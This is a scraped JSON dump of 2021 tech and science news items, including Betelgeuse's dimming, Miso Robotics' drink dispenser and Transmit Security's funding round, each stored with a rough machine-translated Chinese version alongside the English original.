[{"category": "", "categoryclass": "", "imagename": "5eed17fcff4511246cecb99cf020f36c.gif", "infoid": 1067409, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "\u53bb\u5e74\u7684\u660e\u661f\u4ee4\u4eba\u9707\u60ca\u7684\u666f\u89c2 - \u8bb8\u591a\u4eba\u719f\u6089\u7684\u662f\u661f\u5ea7\u730e\u6237\u5ea7\u7684\u201c\u53f3\u80a9\u201d - \u662f\u7531\u660e\u661f\u672c\u8eab\u6240\u55b7\u51fa\u7684\u5c18\u57c3\u4e91\u5f15\u8d77\u7684\u3002 Astrophysicists\u8fbe\u5230\u4e86\u8fd9\u4e00\u7ed3\u8bba\uff0c\u4e8e6\u670816\u65e5\u5728\u81ea\u7136\u754c\u4e2d\u53d1\u5e03\u4e861\uff0c\u5728\u8c03\u5149\u4e4b\u524d\u548c\u4e4b\u540e\u4f7f\u7528BetelgeUSE\u7684\u9ad8\u5206\u8fa8\u7387\u6210\u50cf\uff0c\u7ed3\u5408\u8ba1\u7b97\u673a\u6a21\u62df\u3002\n \u901a\u5e38\uff0cBetelgeuse\u662f\u591c\u7a7a\u4e2d\u6700\u4eae\u7684\u661f\u661f\u4e4b\u4e00\u3002\u51e0\u5341\u5e74\u6765\uff0c\u7814\u7a76\u4eba\u5458\u5df2\u7ecf\u77e5\u9053\u5b83\u7ecf\u5386\u4e86\u6bcf425\u5929\u5927\u7ea6\u6bcf425\u5929\u7684\u8c03\u5149\u7684\u5468\u671f\uff0c\u5728\u6b64\u671f\u95f4\u5b83\u6682\u65f6\u635f\u5931\u4e86\u5176\u9ad8\u5cf0\u4eae\u5ea6\u7684\u56db\u5206\u4e4b\u4e00\u3002\u4f46\u57282020\u5e742\u6708\uff0c\u5929\u6587\u5b66\u5bb6\u6ce8\u610f\u5230\u660e\u661f\u7684\u4eae\u5ea6\u88ab\u524d\u6240\u672a\u6709\u7684\u4e09\u5206\u4e4b\u4e8c\u7684\u4eae\u5ea6\u4e0b\u964d - \u8db3\u4ee5\u4e0e\u8089\u773c\u5f15\u8d77\u660e\u663e\u3002\n  \u672a\u89e3\u91ca\u7684\u8c03\u5149\u4fc3\u8fdb\u4e86\u8fd9\u9897\u660e\u661f\u53ef\u80fd\u4f1a\u7206\u70b8\u7684\u731c\u6d4b\u3002 Betelgeuse\u662f\u4e00\u4e2a\u7ea2\u8272\u7684\u8d85\u7ea7\u5de8\u661f - \u4e00\u79cd\u66f4\u4e3a\u5de8\u5927\u7684\u660e\u661f\uff0c\u6bd4\u592a\u9633\u66f4\u77ed\uff0c\u751a\u81f3\u8d8a\u6765\u8d8a\u77ed - \u5b83\u9884\u8ba1\u5c06\u5728\u672a\u676510\u4e07\u5e74\u7684\u67d0\u4e2a\u65f6\u5019\u7ed3\u675f\u5b83\u7684\u58ee\u89c2\u8d85\u65b0\u661f\u7206\u70b8\u3002\u8fd9\u4e2a\u6d3b\u52a8\u5c06\u63d0\u4f9b\u4e00\u4e2a\u5947\u89c2\uff0c\u5176\u4e2d\u4e00\u4e2a\u4eba\u5728\u51e0\u4e2a\u4e16\u7eaa\u91cc\u6ca1\u6709\u770b\u5230\u54ea\u4e9b\u5730\u7403\uff1a\u57281604\u5e74\u53ef\u4ee5\u89c2\u5bdf\u5230\u7684\u94f6\u6cb3\u7cfb\u4e2d\u6700\u540e\u4e00\u4e2a\u8d85\u65b0\u661f\uff0c\u800cBetelgeuse\u5219\u9760\u8fd1\u6211\u4eec\u7684\u661f\u7403\uff0c\u5176\u8d85\u65b0\u661f\u5c06\u8db3\u591f\u4eae\u767d\u5929\u5728\u51e0\u5468\u5185\u53ef\u89c1\u3002\u8fd9\u9897\u661f\u662f\u5927\u7ea6168\u4e2aParsecs\uff08548\u8f7b\u7684\u5c81\u6708\uff09\uff0c\u6839\u636e\u6700\u65b0\u7684\u4f30\u8ba1\u65702\u3002\n \u4f46\u8bb8\u591a\u5929\u4f53\u7269\u7406\u5b66\u5bb6\u8b66\u544a\u8bf4\uff0c\u8d85\u65b0\u661f\u731c\u6d4b\u662f\u4e00\u53a2\u60c5\u613f\u7684\u601d\u8003\u3002\u4ed6\u4eec\u6307\u51fa\uff0c\u8c03\u5149\u53ef\u80fd\u662f\u7531\u66f4\u5e73\u51e1\u7684\u673a\u5236\u5f15\u8d77\u7684\uff0c\u4f8b\u5982\u51fa\u73b0\u5728\u6052\u661f\u8868\u9762\u4e0a\u7684\u5f02\u5e38\u5bd2\u51b7\u7269\u8d28\uff0c\u5728\u88ab\u79f0\u4e3a\u5bf9\u6d41\u7ec6\u80de\u7684\u60c5\u51b5\u4e0b\uff0c\u6216\u8005\u7a7f\u8fc7\u89c6\u7ebf\u7684\u4e91\u5b83\u3002\n \u73b0\u5728\uff0cAstrophysicist MiguelMontarg\u00e8s\u5728\u5df4\u9ece\u5929\u6587\u53f0\u548c\u4ed6\u7684\u5408\u4f5c\u8005\u53d1\u73b0\uff0c\u201c\u4f1f\u5927\u8c03\u5149\u201d\u7684\u539f\u56e0\u53ef\u80fd\u662f\u4e24\u79cd\u56e0\u7d20\u7684\u7ec4\u5408\u3002\n  \u8be5\u56e2\u961f\u4e8e2019\u5e741\u6708\uff0c2019\u5e7412\u6708\uff0c2019\u5e741\u670820\u65e5\u548c2020\u5e743\u6708\u5360\u636e\u4e86\u4e00\u7cfb\u5217\u9ad8\u5206\u8fa8\u7387\u56fe\u50cf\uff0c\u5728\u667a\u5229\u963f\u5854\u5361\u9a6c\u6c99\u6f20\u4e2d\u4f7f\u7528\u4e86\u975e\u5e38\u5927\u7684\u671b\u8fdc\u955c\u3002 Betelgeuse\u7684\u5bbd\u5ea6\u8d85\u8fc716\u500d\uff0c\u5bbd\u5ea6\u4e3a764\u500d - \u5982\u6b64\u4e4b\u5927\uff0c\u5982\u679c\u5b83\u4f4d\u4e8e\u592a\u9633\u7cfb\u7684\u4e2d\u5fc3\uff0c\u5b83\u5c06\u541e\u566c\u6240\u6709\u884c\u661f\u7684\u8f68\u9053\u5230\u8fbe\u706b\u661f\u3002\u8fd9\u4f7f\u5f97\u5929\u6587\u5b66\u5bb6\u53ef\u4ee5\u4f5c\u4e3a\u78c1\u76d8\u89e3\u6790\u7684\u5c11\u6570\u6052\u661f\u4e4b\u4e00\uff0c\u800c\u4e0d\u662f\u4f5c\u4e3a\u5355\u70b9\u5149\u7ebf\u89e3\u91ca\uff0c\u8499\u5854\u683c\u65af\uff08\u8499\u5854\u683c\uff09\u66fe\u7ecf\u7814\u7a76\u8fc7\u7684\u8d1d\u5c14\u683c\u65af\uff08Betelgeuse\uff09\uff0c\u4ed6\u4eec\u5df2\u7ecf\u6682\u65f6\u5b66\u4e60\u4e86\u5341\u5e74\uff0c\u56e0\u4e3a\u4ed6\u5df2\u7ecf\u5341\u5e74\u6765\u5bf9\u6b64\u611f\u5174\u8da3\u8001\uff0c\u5f53\u5b83\u662f\u4ed6\u80fd\u591f\u5728\u5929\u7a7a\u4e2d\u8bc6\u522b\u7684\u7b2c\u4e00\u4e2a\u660e\u661f\u3002\n  \u56fe\u50cf\u6e05\u695a\u5730\u8868\u660e\uff0c\u4ece\u5730\u7403\u548c\uff0339;\u5317\u534a\u7403\u6240\u770b\u5230\u7684\u661f\u5f62\u5de6\u4fa7\u90e8\u5206 - \u5df2\u7ecf\u663e\u7740\u6697\u4e2d\uff0c\u5e76\u4e14\u8f83\u6697\u533a\u57df\u7684\u4f4d\u7f6e\u5728\u6210\u50cf\u65f6\u671f\u6ca1\u6709\u5927\u5e45\u6539\u53d8\u3002\u8fd9\u8868\u660e\u660f\u6697\u7684\u6591\u70b9\u662f\u7531\u6052\u661f\u672c\u8eab\u6240\u55b7\u5c04\u7684\u7070\u5c18\u5f15\u8d77\u7684\uff0c\u5e76\u4e14\u5728\u89c6\u7ebf\u65b9\u5411\u4e0a\u5927\u81f4\u79fb\u52a8\uff0c\u800c\u4e0d\u662f\u901a\u8fc7\u3002 \u201c\u5982\u679c\u5b83\u662f\u4e00\u4e2a\u4e91\u8fc7\u5883\uff0c\u5b83\u5e94\u8be5\u8d8a\u8fc7\u660e\u661f\uff0c\u201d\u8499\u5854\u5c14\u683c\u65af\u8bf4\u3002 \n\u8be5\u56e2\u961f\u5bf9\u8c03\u5149\u7684\u89e3\u91ca\u662f\u4e00\u4e2a\u5f02\u5e38\u9177\u7684\u5bf9\u6d41\u7ec6\u80de\u5bfc\u81f4\u661f\u5f62\u6c14\u6c1b\u4e2d\u7684\u6e29\u5ea6\u6025\u5267\u4e0b\u964d\u3002\u8fd9\u4f7f\u5f97\u661f\u7403\u5728\u53bb\u5e74\u4e2d\u7206\u53d1\u51fa\u6765\u7684\u6c14\u4f53\u80fd\u591f\u8fc5\u901f\u51dd\u6210\u7070\u5c18\uff0c\u4ece\u6052\u661f\u4e2d\u5835\u585e\u5149\u7ebf\u3002\u8fd9\u4e00\u60c5\u51b5\u662f\u4e00\u4e2a\u9002\u5408\u6570\u636e\u6700\u597d\u7684\u4eba\uff0c\u56e0\u4e3a\u7814\u7a76\u4eba\u5458\u901a\u8fc7\u8fd0\u884c\u8d85\u8fc710,000\u4e2a\u8ba1\u7b97\u673a\u6a21\u62df\u800c\u786e\u8ba4\u3002 \u201c\u4ece\u5efa\u6a21\u7684\u7ed3\u8bba\u662f\u4e24\u4e2a\u4e8b\u4ef6\u5728\u540c\u4e00\u65f6\u95f4\u53d1\u751f\uff0c\u201d\u8499\u5854\u5c14\u683c\u8bf4\u3002\n \u201c\u4eff\u771f\u7684\u4e8b\u5b9e\u8ba9\u6211\u66f4\u52a0\u8bf4\u660e\u201d\u89e3\u91ca\u662f\u6b63\u786e\u7684\uff0c\u9a6c\u91cc\u5170\u5dde\u592a\u7a7a\u671b\u8fdc\u955c\u592a\u7a7a\u79d1\u5b66\u7814\u7a76\u6240\u7684\u5929\u4f53\u7269\u7406\u5b66\u5bb6\u6885\u91cc\u8fea\u8482\u4e54\u585e\u8bf4\u3002\n \u201c\u5982\u679c\u6211\u4eec\u80fd\u591f\u77e5\u9053\u591a\u5c11\u5929\u6216\u591a\u5e74\u7684\u8d1d\u5c14\u683c\u65af\u5e94\u8be5\u7206\u70b8\u4f5c\u4e3a\u8d85\u65b0\u661f\uff0c\u8fd9\u5c06\u662f\u5f88\u68d2\u7684\uff0c\u201d\u82f1\u56fd\u54c8\u7279\u83f2\u5c14\u5fb7\u5927\u5b66\u7684Astrophysicist Chiaki Kobayashi\u8bf4\u3002\u7136\u800c\uff0c\u7814\u7a76\u4eba\u5458\u5c1a\u672a\u5145\u5206\u8be6\u7ec6\u4e86\u89e3Betelgeuse  - \u6216\u8005\u7ea2\u8272\u8d85\u5dee\uff0c\u4ee5\u4fbf\u80fd\u591f\u505a\u51fa\u8fd9\u6837\u7684\u9884\u6d4b\u3002 ", "note_en": "Last year\u2019s dramatic dimming of the star Betelgeuse \u2014 familiar to many as the \u2018right shoulder\u2019 of the constellation Orion \u2014 was caused by a cloud of dust spewed out by the star itself. Astrophysicists reached this conclusion, published on 16 June in  Nature  1, using high-resolution imaging of Betelgeuse before and after the dimming, combined with computer simulations.\n Normally, Betelgeuse is one of the ten brightest stars in the night sky. For decades, researchers have known that it undergoes cycles of dimming roughly every 425 days, during which it temporarily loses about one-quarter of its peak brightness. But in February 2020, astronomers noticed that the star\u2019s brightness had dropped by an unprecedented two-thirds \u2014 enough to be noticeable with the naked eye.\n  The unexplained dimming fuelled speculation that the star could be about to explode. Betelgeuse is a red supergiant \u2014 a type of star that\u2019s more massive and thousands of times shorter-lived than the Sun \u2014 and it is expected to end its life in a spectacular supernova explosion sometime in the next 100,000 years. This event would provide a spectacle the likes of which Earthlings have not seen in centuries: the last supernova in the Milky Way that could be observed from Earth was in 1604, and Betelgeuse is so close to our planet that its supernova will be bright enough to be visible during daytime for weeks. The star is around 168 parsecs (548 light years) away, according to the most current estimates  2.\n But many astrophysicists warned that the supernova speculation was wishful thinking. They pointed out that the dimming was likely to be caused by more mundane mechanisms, such as a blob of unusually cold matter appearing on the surface of the star in what\u2019s known as a convective cell, or a cloud of dust crossing the line of sight to it.\n Now, astrophysicist Miguel Montarg\u00e8s at the Paris Observatory and his collaborators have found that the reason for the \u2018great dimming\u2019 was probably a combination of both of those factors.\n  The team took a series of high-resolution images of the star in January 2019, December 2019, January 2020 and March 2020, using the Very Large Telescope in Chile\u2019s Atacama Desert. Betelgeuse is more than 16 times the mass of the Sun, and 764 times its width \u2014 so big that if it were located at the centre of the Solar System, it would engulf the orbits of all the planets up to Mars. This makes it one of the few stars that astronomers can resolve as a disk, rather than as a single dot of light, explains Montarg\u00e8s, who has been studying Betelgeuse on and off for a decade and has been interested in it since he was ten years old, when it was the first star that he was able to identify in the sky.\n  The images clearly showed that the bottom left-hand part of the star \u2014 as seen from Earth&#39;s Northern Hemisphere \u2014 had dimmed dramatically, and that the position of the darker region did not change substantially over the imaging period. This indicated that the dim spot was caused by a cloud of dust that had been spewed by the star itself, and was moving roughly in the direction of the line of sight, rather than passing by. \u201cIf it had been one cloud transiting, it should have crossed the star,\u201d Montarg\u00e8s says.\n The team\u2019s explanation for the dimming is that an unusually cool convective cell led to a drastic drop in temperature in the star\u2019s atmosphere. This enabled gas that the star had spewed out in the previous year to condense quickly into dust, blocking out light from the star. This scenario was the one that fit the data best, as the researchers confirmed by running more than 10,000 computer simulations. \u201cThe conclusion from the modelling is that both events happened at the same time,\u201d says Montarg\u00e8s.\n \u201cThe fact that a simulation was run makes me more convinced\u201d that the explanation is correct, says Meridith Joyce, an astrophysicist at the Space Telescope Science Institute in Baltimore, Maryland.\n \u201cIt would be wonderful if we could know in how many days or years Betelgeuse should explode as a supernova,\u201d says astrophysicist Chiaki Kobayashi at the University of Hertfordshire in Hatfield, UK. However, researchers don\u2019t yet have a sufficiently detailed understanding of Betelgeuse \u2014 or of red supergiants in general \u2014 to be able to make such a prediction.", "posttime": "2021-06-22 19:11:55", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "\u660e\u661f,star,\u8c03\u5149", "title": "\u53bb\u5e74\uff0c\u4e3a\u4ec0\u4e48\u8d85\u7ea7\u660e\u661fBetelgeuse\u795e\u79d8\u5730\u660f\u6697\u4e86 ", "title_en": "Why the supergiant star Betelgeuse went mysteriously dim last year", "transed": 1, "url": "https://www.nature.com/articles/d41586-021-01633-4", "via": "", "real_tags": ["\u660e\u661f", "star", "\u8c03\u5149"]}, {"category": "", "categoryclass": "", "imagename": "b08a58dc0ed45a2e71ab87823489d23c.jpg", "infoid": 1067407, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "\u4f5c\u4e3a\u4e0e\u996e\u6599\u5206\u914d\u5668\u5236\u9020\u5546Lancer\u5408\u4f5c\u7684\u4e00\u90e8\u5206\u521b\u5efa\u7684\u7cfb\u7edf\u4e3a\u60a8\u7684\u6807\u51c6\u5feb\u9910\u55b7\u6cc9\u5e26\u6765\u4e86\u989d\u5916\u7684\u81ea\u52a8\u5316\u6c34\u5e73\u3002\u5b83\u6709\u4e00\u4e2a\u76f4\u63a5\u96c6\u6210\u7684\u9500\u552e\u70b9\uff0c\u5b83\u8e22\u51fa\u4e86\u6d47\u6ce8\uff0c\u5bc6\u5c01\u548c\u63a8\u8fdb\u996e\u6599\u7684\u8fc7\u7a0b\u3002\u9664\u6b64\u4e4b\u5916\uff0c\u5b83\u4e0e\u66f4\u5927\u7684\u9500\u552e\u7cfb\u7edf\u96c6\u6210\uff0c\u4ee5\u786e\u4fdd\u5b83\u5728\u5185\u90e8\u5ba2\u6237\u548c\u4ea4\u4ed8\u53f8\u673a\u4e4b\u95f4\u83b7\u5f97\u8ba2\u5355\u3002\n   \u57fa\u672c\u4e0a\u5b83\u662f\u60a8\u5728\u6bcf\u95f4\u5feb\u9910\u9910\u5385\u548c\u7535\u5f71\u9662\u9047\u5230\u7684\u55b7\u6cc9\u66f4\u667a\u80fd\u7684\u7248\u672c\u3002\u5f53\u7136\uff0c\u8be5\u516c\u53f8\u8868\u793a\uff0c\u8be5\u7c7b\u522b\u7684\u5174\u8da3\u53ea\u4f1a\u5728\u8fc7\u53bb\u4e00\u5e74\u534a\u7684\u52b3\u52a8\u529b\u77ed\u7f3a\u548c\u5927\u6d41\u884c\u4e2d\u589e\u52a0\u4e86\u5927\u90e8\u5206\u52b3\u52a8\u529b\u3002\n \u201cLancer\u5728\u996e\u6599\u521b\u65b0\u548c\u672a\u6765\u6d3e\u8bbe\u8ba1\u7684\u613f\u666f\u4e2d\u5177\u6709\u8131\u9896\u800c\u884c\u7684\u884c\u4e1a\u8d28\u91cf\u548c\u80a1\u7968\u7684\u9057\u4ea7\uff0c\u201dMiso\u9996\u5e2d\u6218\u7565\u5b98\u5458Jake Brewer\u5728\u4eca\u5929\u65e9\u4e0a\u7684\u6d88\u606f\u4e2d\u7ed1\u5b9a\u4e86\u65b0\u95fb\u7a3f\u3002 \u201c\u8ba2\u5355\u5c65\u884c\u662f\u5ba2\u6237\u6ee1\u610f\u5ea6\u7684\u4e3b\u8981\u56e0\u7d20\uff0c\u8fd0\u8425\u5546\u5728\u9001\u8d27\u9a7e\u9a76\u5458\u6216\u5ba2\u6237\u8bbf\u95ee\u65f6\u7559\u4e0b\u4e86\u7559\u4e0b\u7684\u996e\u6599\u3002\u6211\u4eec\u975e\u5e38\u5174\u594b\u5730\u521b\u5efa\u4e00\u4e2a\u4ea7\u54c1\uff0c\u4e0d\u4ec5\u4f1a\u4f7f\u5546\u4e1a\u53a8\u623f\u5de5\u4f5c\u7684\u4eba\u66f4\u597d\uff0c\u800c\u4e14\u5c06\u6210\u4e3a\u6574\u4e2a\u884c\u4e1a\u7684\u6e38\u620f\u53d8\u9891\u5668\uff0c\u4ee5\u63d0\u4f9b\u4e16\u754c\u7ea7\u5ba2\u6237\u4f53\u9a8c\u3002\u201c\n  \u8c08\u5230\u63a0\u593a\u65f6\u7684\u7f62\u5de5\uff0c\u516c\u53f8\u4e5f\u4f7f\u7528\u673a\u4f1a\u5ba3\u5e03\u8ba1\u5212\u7684\u7cfb\u5217D\uff0c\u6700\u8fd1\u5c01\u95ed\u4e862500\u4e07\u7f8e\u5143C. ", "note_en": "The system, which is being created as part of a partnership with beverage dispenser manufacturer Lancer, brings an added level of automation to your standard fast food fountain. It has a point of sale system directly integrated, which kicks off the process of pouring, sealing and advancing the drink. Beyond that, it\u2019s integrated with a larger sales system to ensure that it\u2019s getting orders right, between in-person customers and delivery drivers.\n   Basically it\u2019s a much smarter version of the fountain you encounter in every fast food restaurant and movie theater. Naturally, the company says that interest in the category has only increased amid labor shortages and a pandemic that froze much of the available workforce over the past year and a half.\n \u201cLancer has a legacy of stand-out industry quality and shares in our vision for beverage innovation and futuristic design,\u201d Miso Chief Strategy Officer Jake Brewer said in a press release tied to this morning\u2019s news. \u201cOrder fulfillment is a major factor for customer satisfaction and operators can\u2019t afford to have a beverage left behind when a delivery driver or customer visits. We are extremely excited to create a product that will not only make the lives of those working in commercial kitchens better, but will be a game changer for the industry as a whole to deliver a world-class customer experience.\u201d\n  Speaking of striking while the iron is hot, the company is also using the opportunity to announce a planned Series D, following up on a recently closed $25 million Series C.", "posttime": "2021-06-22 18:30:49", "source_domain": "slashdot.org", "source_name": "slashdot", "tags": "\u673a\u5668\u4eba,\u7ffb\u8f6c,flipping,\u5ba2\u6237", "title": "\u6c49\u5821\u7ffb\u8f6c\u673a\u5668\u4eba\u516c\u53f8MISO\u63a8\u51fa\u81ea\u52a8\u996e\u6599\u5206\u914d\u5668 ", "title_en": "\n\t\t\t\tHamburger-flipping robotics company Miso introduces an automated beverage dispenser\t\t\t", "transed": 1, "url": "https://techcrunch.com/2021/06/22/hamburger-flipping-robotics-maker-miso-introduces-automated-beverage-dispenser/", "via": "", "real_tags": ["\u673a\u5668\u4eba", "\u7ffb\u8f6c", "flipping", "\u5ba2\u6237"]}, {"category": "", "categoryclass": "", "imagename": "2e2e71d180955b83e162ff9a8188e0c0.jpg", "infoid": 1067406, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "\u878d\u8d44\u56de\u5408\uff0c\u8868\u793a\u662f\u6700\u5927\u7684\u7f51\u7edc\u5b89\u5168\u5386\u53f2\u6295\u8d44\u548c\u4e00\u4e2a\u5f15\u5bfc\u516c\u53f8\u7684\u6700\u9ad8\u4f30\u503c\u4e4b\u4e00\uff0c\u7531\u6d1e\u5bdf\u529b\u5408\u4f5c\u4f19\u4f34\u548c\u5927\u897f\u6d0b\u9886\u5bfc\uff0c\u6765\u81eaCyber\u200b\u200bstarts\uff0cGeodesic\uff0cSyn Ventures\uff0cVintage\u548cArtisanal\u7684\u989d\u5916\u6295\u8d44\u5192\u9669\u3002\n \u4f20\u8f93\u5b89\u5168\u79f0\uff0c\u5b83\u5177\u670922\u4ebf\u7f8e\u5143\u7684\u62e8\u6b3e\u4f30\u503c\uff0c\u5e76\u5c06\u5229\u7528\u65b0\u8d44\u91d1\u6269\u5927\u5176\u8986\u76d6\u8303\u56f4\u5e76\u6295\u8d44\u91cd\u70b9\u5168\u7403\u5730\u533a\u4ee5\u53d1\u5c55\u672c\u7ec4\u7ec7\u3002\n \u7136\u800c\uff0c\u6700\u7ec8\uff0c\u8d44\u91d1\u56de\u5408\u5c06\u6709\u52a9\u4e8e\u516c\u53f8\u52a0\u901f\u5176\u4f7f\u547d\u5e2e\u52a9\u4e16\u754c\u65e0\u5bc6\u7801\u3002\u6839\u636e\u201c\u521b\u4e1a\u677f\u201d\uff0c\u7ec4\u7ec7\u6bcf\u5e74\u51cf\u5c11\u6570\u767e\u4e07\u7f8e\u5143\u7684\u7f8e\u5143\u5bc6\u7801\u7684\u8eab\u4efd\u9a8c\u8bc1;\u4e0d\u4ec5\u5f31\u5bc6\u7801\u5360\u6240\u6709\u6570\u636e\u6cc4\u9732\u768480\uff05\u4ee5\u4e0a\uff0c\u4f46\u5e73\u5747\u5e2e\u52a9\u53f0\u52b3\u52a8\u529b\u6210\u672c\u91cd\u7f6e\u5355\u4e2a\u5bc6\u7801\u8d85\u8fc770\u7f8e\u5143\u3002\n \u4f20\u8f93\u8868\u793a\uff0c\u5176\u751f\u7269\u8bc6\u522b\u7684\u9a8c\u8bc1\u8005\u662f\u7b2c\u4e00\u4e2a\u672c\u8eab\u7684\u65e0\u5bc6\u7801\u6807\u8bc6\u548c\u98ce\u9669\u7ba1\u7406\u89e3\u51b3\u65b9\u6848\uff0c\u5b83\u5df2\u88ab\u8bb8\u591a\u5927\u578b\u54c1\u724c\u91c7\u7528\uff0c\u5305\u62ecLowes\uff0cSantander\u548cUB\u3002\u8be5\u89e3\u51b3\u65b9\u6848\u76ee\u524d\u6bcf\u79d2\u5904\u7406\u8d85\u8fc79,000\u540d\u8ba4\u8bc1\u8bf7\u6c42\uff0c\u53ef\u4ee5\u5c06\u5e10\u6237\u91cd\u7f6e\u4e3a96\uff05\uff0c\u5e76\u5c06\u5ba2\u6237\u8ba4\u8bc1\u4ece1\u5206\u949f\u964d\u81f32\u79d2\u3002\n \u201c\u901a\u8fc7\u6d88\u9664\u5bc6\u7801\uff0c\u4f01\u4e1a\u53ef\u4ee5\u7acb\u5373\u51cf\u5c11\u6d41\u5931\u548c\u8d2d\u7269\u8f66\u653e\u5f03\u5e76\u4e3a\u4e2a\u4eba\u6570\u636e\u63d0\u4f9b\u5353\u8d8a\u7684\u5b89\u5168\u6027\uff0c\u201d\u57282014\u5e74\u5171\u540c\u521b\u7acb\u4e86\u516c\u53f8\u7684\u4f20\u8f93\u5b89\u5168CEO\u7c73\u57faBoodai\u8868\u793a\u3002\u201c\u6211\u4eec\u7684\u5ba2\u6237\uff0c\u65e0\u8bba\u4ed6\u4eec\u662f\u96f6\u552e\uff0c\u94f6\u884c\uff0c\u91d1\u878d\uff0c\u7535\u4fe1\u6216\u6c7d\u8f66\u90e8\u95e8\uff0c\u4e86\u89e3\u63d0\u4f9b\u4f18\u5316\u7684\u8eab\u4efd\u7ecf\u9a8c\u662f\u591a\u7c73\u7684\u6311\u6218\u3002\u501f\u52a9\u6765\u81eaPremier Partners\u7684\u6700\u65b0\u4e00\u8f6e\u8d44\u91d1\uff0c\u6211\u4eec\u53ef\u4ee5\u5927\u5927\u6269\u5927\u6211\u4eec\u7684\u8986\u76d6\u8303\u56f4\u6765\u5e2e\u52a9\u6446\u8131\u5bc6\u7801\u4e16\u754c\u3002\u201c\n \u4f20\u8f93\u5b89\u5168\u6027\u4e0d\u662f\u552f\u4e00\u4e00\u4e2a\u5728\u4efb\u52a1\u4e0a\u6740\u6389\u5bc6\u7801\u7684\u516c\u53f8\u3002 Microsoft\u5ba3\u5e03\u8ba1\u5212\u5236\u4f5cWindows 10\u65e0\u5bc6\u7801\uff0cApple\u6700\u8fd1\u9884\u89c8\u4e86iCloud keychain\u7684Passkeys\uff0c\u8fd9\u662f\u7531WebAuthn\u63d0\u4f9b\u652f\u6301\u7684\u65e0\u5bc6\u7801\u8ba4\u8bc1\u7684\u65b9\u6cd5\uff0c\u4ee5\u53ca\u9762\u90e8ID\u548c\u89e6\u6478ID\u3002 ", "note_en": "The funding round, said to be the largest Series A investment in cybersecurity history and one of the highest valuations for a bootstrapped company, was led by  Insight Partners and General Atlantic, with additional investment from Cyberstarts, Geodesic, SYN Ventures, Vintage, and Artisanal Ventures.\n Transmit Security said it has a pre-money valuation of $2.2 billion, and will use the new funds to expand its reach and investing in key global areas to grow the organization.\n Ultimately, however, the funding round will help the company to accelerate its mission to help the world go passwordless. Organizations lose millions of dollars every year due to \u201cinherently unsafe\u201d password-based authentication, according to the startup; not only do weak passwords account for more than 80% of all  data breaches, but the average help desk labor cost to reset a single password stands at more than $70.\n Transmit says its biometric-based authenticator is the first natively passwordless identity and risk management solution, and it has already been adopted by a number of big-name brands including Lowes, Santander, and UBS. The solution, which currently handles more than 9,000 authentication requests per second, can reduce account resets by 96%, the company says, and reduces customer authentication from 1 minute to 2 seconds.\n \u201cBy eliminating passwords, businesses can immediately reduce churn and cart abandonment and provide superior security for personal data,\u201d said Transmit Security CEO Mickey Boodaei, who co-founded the company in 2014. \u201cOur customers, whether they are in the retail, banking, financial, telecommunications, or automotive sectors, understand that providing an optimized identity experience is a multimillion-dollar challenge. With this latest round of funding from premier partners, we can significantly expand our reach to help rid the world of passwords.\u201d\n Transmit Security isn\u2019t the only company that\u2019s on a mission to kill off the password. Microsoft has announced plans to make  Windows 10 password-free, and  Apple recently previewed Passkeys in iCloud Keychain, a method of passwordless authentication powered by  WebAuthn, and Face ID and Touch ID.", "posttime": "2021-06-22 18:30:37", "source_domain": "slashdot.org", "source_name": "slashdot", "tags": "\u5bc6\u7801,\u5b89\u5168\u6027,security", "title": "\u4f20\u8f93\u5b89\u5168\u6027\u63d0\u9ad8\u4e86543\u7c73\u7cfb\u5217A\u624d\u80fd\u7ec8\u6b62\u5bc6\u7801 ", "title_en": "\n\t\t\t\tTransmit Security raises $543M Series A to kill off the password\t\t\t", "transed": 1, "url": "https://techcrunch.com/2021/06/22/transmit-security-raises-543m-series-a-to-kill-off-the-password/", "via": "", "real_tags": ["\u5bc6\u7801", "\u5b89\u5168\u6027", "security"]}, {"category": "", "categoryclass": "", "imagename": "3e967154742b17efac2d0f4d16be0575.jpg", "infoid": 1067404, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "\u7ecf\u8fc7\u516d\u4e2a\u6708\u7684\u8f68\u9053\u8f68\u9053\u8f68\u9053\u548c\u6821\u51c6\u540e\uff0cSentinel-6 Michael Freilich\u536b\u661f\u5c06\u4e8e6\u670822\u65e5\u5411\u516c\u4f17\u63d0\u4f9b\u5176\u524d\u4e24\u4e2a\u6570\u636e\u6d41\u3002\u5b83\u4e8e11\u670821\u65e5\u5728\u52a0\u5229\u798f\u5c3c\u4e9a\u5dde\u7684Vandenberg\u7a7a\u519b\u57fa\u5730\u63a8\u51fa\uff0c\u5e76\u4e14\u662f\u7f8e\u56fd\u6b27\u6d32\u5408\u4f5c\uff0c\u4ee5\u6d4b\u91cf\u6d77\u9762\u9ad8\u5ea6\u548c\u5176\u4ed6\u5173\u952e\u6d77\u6d0b\u7279\u5f81\uff0c\u5982\u6d77\u6d0b\u8868\u9762\u98ce\u901f\u548c\u6ce2\u6d6a\u9ad8\u5ea6\u3002\u5c06\u91ca\u653e\u7684\u6d77\u9762\u9ad8\u5ea6\u4e4b\u4e00\u662f2.3\u82f1\u5bf8\uff085.8\u5398\u7c73\uff09\u7684\u51c6\u786e\u6027\uff0c\u5f53\u4eea\u5668\u8239\u8236\u5bc4\u5bbfin-6 Michael 